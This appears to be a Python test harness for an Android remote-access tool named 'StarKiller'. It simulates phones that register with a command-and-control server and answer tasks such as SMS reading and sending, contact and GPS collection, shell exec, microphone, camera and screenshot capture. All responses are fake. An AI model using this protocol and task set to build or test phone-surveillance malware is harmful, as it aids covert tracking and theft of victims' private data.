"""
StarKiller Test Harness — simulate multiple Android agents without real devices.
Spawns N fake agents that connect to the C2, register, heartbeat, and respond to tasks.
"""
import socket
import struct
import json
import threading
import time
import random
import string
import sys
import os

FAKE_DEVICES = [
    {"model": "Samsung Galaxy S24", "manufacturer": "samsung", "android": "14", "sdk": 34, "carrier": "Telstra"},
    {"model": "Google Pixel 8", "manufacturer": "Google", "android": "14", "sdk": 34, "carrier": "Optus"},
    {"model": "OnePlus 12", "manufacturer": "OnePlus", "android": "14", "sdk": 34, "carrier": "Vodafone"},
    {"model": "Xiaomi 14", "manufacturer": "Xiaomi", "android": "14", "sdk": 34, "carrier": "Boost"},
    {"model": "Oppo Find X7", "manufacturer": "OPPO", "android": "14", "sdk": 34, "carrier": "Telstra"},
    {"model": "Sony Xperia 1 VI", "manufacturer": "Sony", "android": "14", "sdk": 34, "carrier": "Optus"},
    {"model": "Motorola Edge 50", "manufacturer": "motorola", "android": "14", "sdk": 34, "carrier": "Vodafone"},
    {"model": "Huawei P60", "manufacturer": "HUAWEI", "android": "13", "sdk": 33, "carrier": "Telstra"},
]

FAKE_CONTACTS = [
    {"name": "John Smith", "number": "+61412345678", "type": 1},
    {"name": "Jane Doe", "number": "+61423456789", "type": 1},
    {"name": "Bob Wilson", "number": "+61434567890", "type": 2},
]

FAKE_SMS = [
    {"id": 1, "address": "+61412345678", "body": "Hey are you coming tonight?", "date": 1718900000000, "read": True},
    {"id": 2, "address": "+61423456789", "body": "Meeting at 3pm confirmed", "date": 1718890000000, "read": False},
]

FAKE_APPS = [
    {"package": "com.whatsapp", "name": "WhatsApp", "system": False, "enabled": True},
    {"package": "com.instagram.android", "name": "Instagram", "system": False, "enabled": True},
    {"package": "com.google.android.gm", "name": "Gmail", "system": True, "enabled": True},
    {"package": "com.android.chrome", "name": "Chrome", "system": True, "enabled": True},
    {"package": "com.facebook.katana", "name": "Facebook", "system": False, "enabled": True},
    {"package": "com.spotify.music", "name": "Spotify", "system": False, "enabled": True},
]


def send_msg(sock, data):
    raw = json.dumps(data).encode()
    sock.sendall(struct.pack(">I", len(raw)) + raw)


def recv_msg(sock):
    header = b""
    while len(header) < 4:
        chunk = sock.recv(4 - len(header))
        if not chunk:
            return None
        header += chunk
    size = struct.unpack(">I", header)[0]
    if size <= 0 or size > 10_000_000:
        return None
    body = b""
    while len(body) < size:
        chunk = sock.recv(size - len(body))
        if not chunk:
            return None
        body += chunk
    return json.loads(body.decode())


class FakeAgent(threading.Thread):
    def __init__(self, host, port, device_profile, agent_num):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.dev = device_profile
        self.agent_id = f"test-{agent_num:03d}"
        self.sock = None
        self.alive = True
        self.battery = random.randint(15, 100)
        self.lat = -33.8688 + random.uniform(-0.05, 0.05)
        self.lon = 151.2093 + random.uniform(-0.05, 0.05)

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        reg = {
            "type": "register",
            "agent_id": self.agent_id,
            "hostname": self.dev["model"],
            "os": f"Android {self.dev['android']}",
            "platform": "android",
            "model": f"{self.dev['manufacturer']} {self.dev['model']}",
            "sdk": self.dev["sdk"],
        }
        send_msg(self.sock, reg)
        print(f"  [{self.agent_id}] registered as {self.dev['model']} ({self.dev['carrier']})")

    def heartbeat_loop(self):
        while self.alive:
            try:
                self.battery = max(1, self.battery - random.randint(0, 2))
                hb = {
                    "type": "heartbeat",
                    "agent_id": self.agent_id,
                    "battery": self.battery,
                    "last_gps": f"{self.lat:.4f},{self.lon:.4f}",
                }
                send_msg(self.sock, hb)
            except Exception:
                break
            time.sleep(10)

    def handle_task(self, task):
        op = task.get("op", "")
        task_id = task.get("task_id", "unknown")
        print(f"  [{self.agent_id}] task: {op} (id={task_id})")

        if op == "sysinfo":
            result = {
                "manufacturer": self.dev["manufacturer"],
                "model": self.dev["model"],
                "android_version": self.dev["android"],
                "sdk_int": self.dev["sdk"],
                "carrier": self.dev["carrier"],
                "android_id": "".join(random.choices(string.hexdigits[:16], k=16)),
                "battery": self.battery,
            }
        elif op == "gps":
            self.lat += random.uniform(-0.001, 0.001)
            self.lon += random.uniform(-0.001, 0.001)
            result = {
                "latitude": self.lat,
                "longitude": self.lon,
                "altitude": random.uniform(0, 50),
                "accuracy": random.uniform(3, 30),
                "provider": "gps",
                "time": int(time.time() * 1000),
            }
        elif op == "contacts":
            result = {"count": len(FAKE_CONTACTS), "contacts": FAKE_CONTACTS}
        elif op == "sms_read":
            result = {"count": len(FAKE_SMS), "messages": FAKE_SMS}
        elif op == "sms_send":
            result = {"status": "sent", "to": task.get("number", "unknown")}
        elif op == "apps":
            result = {"count": len(FAKE_APPS), "apps": FAKE_APPS}
        elif op == "calllog":
            result = {"count": 0, "calls": []}
        elif op == "ls":
            path = task.get("path", "/sdcard")
            result = {
                "path": path,
                "count": 3,
                "entries": [
                    {"name": "DCIM", "type": "dir", "size": 0},
                    {"name": "Download", "type": "dir", "size": 0},
                    {"name": "notes.txt", "type": "file", "size": 1024},
                ],
            }
        elif op == "exec":
            cmd = task.get("command", "")
            result = {"stdout": f"[simulated] {cmd}\n", "stderr": "", "exit_code": 0}
        elif op == "mic":
            dur = task.get("duration", 5)
            result = {"status": "recorded", "duration": dur, "size": dur * 8000, "data": "[simulated_audio]"}
        elif op == "camera":
            facing = task.get("facing", "rear")
            result = {"status": "captured", "facing": facing, "size": 50000, "data": "[simulated_jpeg]"}
        elif op == "screenshot":
            result = {"status": "captured", "size": 100000, "data": "[simulated_png]"}
        elif op == "recon":
            result = {
                "device": {"model": self.dev["model"], "carrier": self.dev["carrier"]},
                "location": {"latitude": self.lat, "longitude": self.lon},
                "apps": {"count": len(FAKE_APPS)},
            }
        elif op == "ping":
            result = {"pong": int(time.time() * 1000)}
        elif op == "exit":
            send_msg(self.sock, {"type": "result", "agent_id": self.agent_id, "task_id": task_id, "data": {"status": "exiting"}})
            self.alive = False
            return
        else:
            result = {"error": f"unknown op: {op}"}

        send_msg(self.sock, {"type": "result", "agent_id": self.agent_id, "task_id": task_id, "data": result})
        print(f"  [{self.agent_id}] responded to {op}")

    def run(self):
        try:
            self.connect()
            hb_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
            hb_thread.start()

            while self.alive:
                msg = recv_msg(self.sock)
                if msg is None:
                    break
                if msg.get("type") == "task":
                    self.handle_task(msg)
        except Exception as e:
            print(f"  [{self.agent_id}] disconnected: {e}")
        finally:
            try:
                self.sock.close()
            except Exception:
                pass


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8667
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 4

    print(f"\n  STARKILLER TEST HARNESS")
    print(f"  target: {host}:{port}")
    print(f"  spawning {count} fake agent(s)\n")

    agents = []
    for i in range(count):
        dev = FAKE_DEVICES[i % len(FAKE_DEVICES)]
        agent = FakeAgent(host, port, dev, i + 1)
        agents.append(agent)
        agent.start()
        time.sleep(0.3)

    print(f"\n  all {count} agents connected — open C2 dashboard to see them")
    print(f"  http://{host}:8666")
    print(f"  press Ctrl+C to kill all agents\n")

    try:
        while True:
            time.sleep(1)
            alive = sum(1 for a in agents if a.alive)
            if alive == 0:
                print("  all agents terminated")
                break
    except KeyboardInterrupt:
        print(f"\n  killing {len(agents)} agents...")
        for a in agents:
            a.alive = False


if __name__ == "__main__":
    main()
